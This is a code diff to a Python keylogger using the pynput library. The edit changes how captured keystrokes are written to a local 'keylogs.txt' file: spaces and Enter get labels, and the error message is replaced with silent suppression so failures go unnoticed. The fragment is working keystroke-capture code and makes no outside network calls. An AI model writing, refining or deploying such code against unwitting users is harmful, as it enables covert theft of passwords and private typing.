@@ -2,13 +2,15 @@ from pynput import keyboard
 
 def on_press(key):
     try:
-        with open('keylogs.txt', 'a') as f:
-            if hasattr(key, 'char'):
-                f.write(key.char)
+        with open("keylogs.txt", "a") as f:
+            if key == keyboard.Key.space:
+                f.write(' [SPACE] ')
+            elif key == keyboard.Key.enter:
+                f.write('\n[ENTER]\n')
             else:
-                f.write(f'[{str(key)}]')
+                f.write(str(key).strip("'"))
     except Exception as e:
-        print(f"Error occurred while writing to file: {e}")
+        pass
 
 def on_release(key):
     if key == keyboard.Key.esc:
